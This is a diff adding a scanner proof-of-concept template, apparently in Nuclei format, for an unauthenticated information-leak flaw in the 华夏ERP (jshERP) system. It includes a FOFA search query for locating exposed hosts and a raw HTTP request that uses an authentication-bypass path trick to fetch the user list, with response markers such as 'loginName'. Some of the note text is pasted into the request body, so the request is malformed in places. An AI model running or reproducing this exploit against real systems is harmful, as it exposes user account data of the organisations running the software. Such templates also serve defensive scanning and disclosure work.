@@ -1,0 +1,49 @@
+id: poc-ys1sub6ictp165do
+info:
+  name: 华夏ERP getAllList信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ys1sub6ictp165do'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ys1sub6ictp165do
+    fofa: body="jshERP-boot"
+http:
+- raw:
+  - 'GET /jshERP-boot/user/a.ico/../getAllList HTTP/1.1
+
+
+    Connection: close
+
+
+    Accept: application/signed-exchange;v=b3;q=0.7,*/*;q=0.8
+
+
+    Accept-Language: en
+
+
+    sec-ch-ua-platform: Windows
+
+
+    Accept-Encoding: gzip
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    loginName
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
